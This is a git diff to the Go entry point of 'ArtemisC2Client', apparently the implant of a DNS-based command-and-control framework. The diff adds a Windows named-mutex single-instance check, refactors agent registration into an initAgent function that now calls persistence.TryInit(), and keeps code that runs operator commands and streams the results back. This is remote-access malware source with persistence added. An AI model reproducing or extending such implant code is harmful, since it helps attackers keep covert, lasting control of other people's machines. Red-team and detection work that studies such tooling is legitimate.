@@ -3,7 +3,9 @@ package main
 import (
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/desertcod98/ArtemisC2Client/chunkedtransfer"
 	"github.com/desertcod98/ArtemisC2Client/commands"
@@ -11,21 +13,31 @@ import (
 	"github.com/desertcod98/ArtemisC2Client/dns"
 	"github.com/desertcod98/ArtemisC2Client/encoding"
 	"github.com/desertcod98/ArtemisC2Client/log"
+	"github.com/desertcod98/ArtemisC2Client/persistence"
 	"github.com/desertcod98/ArtemisC2Client/utils"
 )
 
 func main() {
+	// Single instance check: Named mutex Windows
+	mutexName := "ArtemisC2ClientMutex"
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	createMutex := kernel32.NewProc("CreateMutexW")
+	namePtr, _ := syscall.UTF16PtrFromString(mutexName)
+	_, _, lastErr := createMutex.Call(0, 0, uintptr(unsafe.Pointer(namePtr)))
+
+	// 183 is the error for Mutex already existing
+	if errno, ok := lastErr.(syscall.Errno); ok && errno == 183 {
+		return
+	}
+
 	cfg, configErr := config.LoadConfig()
 
 	if configErr != nil {
-		agentId, handshakeErr := doHandshake()
-		if handshakeErr != nil {
-			log.Log("Handshake error:", handshakeErr)
+		err := initAgent(cfg)
+		if err != nil {
+			log.Log(err.Error())
 			return
 		}
-		cfg.AgentId = agentId
-		cfg.BeaconInterval = 10 // seconds
-		config.SaveConfig(cfg)
 	}
 
 	ctx := initContext(cfg)
@@ -110,7 +122,7 @@ func collectAndSendResult(cmd commands.Command, commandArgs []string, job string
 func collectAndSendStreamResult(cmd commands.StreamCommand, commandArgs []string, job string) {
 	stream, totalBytes, closer := cmd.Execute(commandArgs)
 	if closer != nil {
-			defer closer.Close()
+		defer closer.Close()
 	}
 	transfer := chunkedtransfer.NewTransfer(job, stream, uint64(totalBytes))
 	transfer.Send()
@@ -121,4 +133,19 @@ func initContext(cfg *config.Config) *config.Context {
 		Config:              cfg,
 		SetBeaconIntervalCh: make(chan int, 1),
 	}
+}
+
+func initAgent(cfg *config.Config) error {
+	agentId, handshakeErr := doHandshake()
+	if handshakeErr != nil {
+		log.Log("Handshake error:", handshakeErr)
+		return handshakeErr
+	}
+	cfg.AgentId = agentId
+	cfg.BeaconInterval = 10 // seconds
+	config.SaveConfig(cfg)
+
+	persistence.TryInit()
+
+	return nil
 }
